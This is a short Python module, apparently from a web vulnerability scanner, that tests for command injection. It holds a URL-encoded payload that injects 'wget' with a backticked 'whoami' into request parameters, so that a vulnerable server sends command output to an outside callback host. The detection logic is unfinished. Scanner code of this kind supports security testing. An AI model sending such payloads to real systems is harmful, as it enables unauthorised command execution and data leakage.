# coding: utf-8
'''
Created on Nov 12, 2019

@author: guimaizi
'''
from config_module import param_process, http_testing, config_function


class cmd_inj:
    def __init__(self):
        '''命令注入测试'''
        self.config= config_function.config_function()
        self.param_process= param_process.param_process([
            'XSSS1%20%7C%20wget%20http%3A%2F%2Ftest.guimaizi.com%2F1.php%3F%60whoami%60%20%7C%7C%20aaa'])
        self.http_testing= http_testing.http_testing()
    def run(self,request_data):
        for target_list in self.param_process.main(request_data):
            for target in target_list:
                if 'aa ' in self.http_testing.callback_response(target['data']):
                    pass
if __name__ == '__main__':
    p1=cmd_inj()
    p1.run()